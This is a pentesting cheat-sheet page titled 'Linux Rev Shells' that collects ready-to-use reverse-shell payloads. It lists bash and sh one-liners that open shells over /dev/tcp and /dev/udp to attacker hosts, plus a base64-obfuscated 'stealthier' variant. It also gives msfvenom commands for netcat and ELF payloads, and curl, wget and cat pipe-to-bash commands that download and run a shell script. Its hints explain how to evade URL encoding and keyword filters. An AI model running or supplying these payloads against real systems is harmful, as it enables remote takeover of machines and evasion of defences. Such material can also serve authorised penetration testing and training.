# Linux Rev Shells

{% tabs %}
{% tab title="bash|sh" %}
### Payloads

```bash
curl http://reverse-shell.sh/1.1.1.1:3000 | bash
<sh -i >& /dev/udp/<LHOST>/<LPORT> 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (cretdits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell, to get the output execute
exec >&0
```

### Bypass

```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
echo "bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'" | base64 -w 0
echo -n bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash
```

{% hint style="warning" %}
In base64, we must be careful with the symbols **+** , because if it is being processed in URL Encode, it may be interpreted as a space. To solve this, we can copy the payload and play with CyberChief. For example, the following payload encoded in base64 does not have the **+** symbols: `bash -c 'bash -i >& /dev/tcp/10.10.14.4/4444 0>&1'` (note the double spaces we left in some parts).
{% endhint %}
{% endtab %}

{% tab title="msfvenom" %}
```bash
# To generate a netcat command:
msfvenom -p cmd/unix/reverse_netcat LHOST=<LHOST> LPORT=<LPORT> R
# ELF file:
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o <outout_name>.elf
chmod +x <FILE>.elf
```
{% endtab %}

{% tab title="Download" %}
We can create a script in Bash with a script to get a reverse shell, and then host it on a simple web server so we can download it and run it with tools like `curl`, `wget` and `cat`.

The bash script would be as follows:

```bash
#!/bin/bash

bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
```

And to download it and run it in a single command, we can do it in multiple ways:

```bash
curl http://<LHOST>/shell.sh | bash
wget -qO- http://<LHOST>/shell.sh | bash
# With cat it is preferable to open a server with nc:
sudo nc -nlvp 80 < shell.sh # Attacker machine
cat < /dev/tcp/<LHOST>/80 | bash # Victim machine (method 1)
bash -c 'cat < /dev/tcp/<LHOST>/80 | bash' # Victim machine (method 2)
```

{% hint style="warning" %}
Another thing we can do is to create an index.html file with the payload (i.e. with the contents of **shell.sh**). Then we do: `wget -qO- <LHOST> | bash` . This way we avoid keywords like **http**, **slashes** ("/") or **colons** (":").
{% endhint %}
{% endtab %}

{% tab title="Different languages" %}
```bash
curl <LHOST>/shell.txt|bash # To execute a Bash script.
curl <LHOST>/shell.txt|php # To execute a PHP script
curl <LHOST>/shell.txt|python3 # To execute a Python script.
```
{% endtab %}
{% endtabs %}



